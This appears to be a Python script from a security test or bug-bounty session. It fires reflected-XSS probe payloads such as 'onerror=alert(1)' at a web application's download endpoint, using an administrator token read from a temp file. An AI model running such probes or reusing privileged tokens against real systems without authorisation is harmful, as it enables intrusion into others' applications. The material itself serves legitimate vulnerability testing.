import json,subprocess,os,uuid
H=os.environ['H']; BB=os.environ['BB']
TOK=open('/tmp/bac_SYSADMIN').read().strip()
tag='ZXN'+uuid.uuid4().hex[:5]
print("=== /download?file_id=&name= — is name reflected? ===")
cases=[
 ('plain',   f'zx{tag}.csv'),
 ('xss',     f'<img src=x onerror=alert(1)>{tag}.csv'),
 ('quote',   f'"><svg onload=alert(1)>{tag}.csv'),
 ('pct',     f'%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E{tag}.csv'),
]
for label,name in cases:
    url=f'{H}/download?file_id=2799&name={name}'
    cmd=['curl','-s','-m','30','-o','/tmp/d','-w','%{http_code}|%{content_type}',url,
         '-H','token: '+TOK,'-H',BB]
    r=subprocess.run(cmd,capture_output=True,text=True).stdout.strip()
    body=open('/tmp/d',encoding='utf-8',errors='replace').read()
    print(f"\n  {label:8} {r}")
    print(f"    reflected_raw={'<img' in body or '<svg' in body}")
    print(f"    body_head={body[:160]!r}")
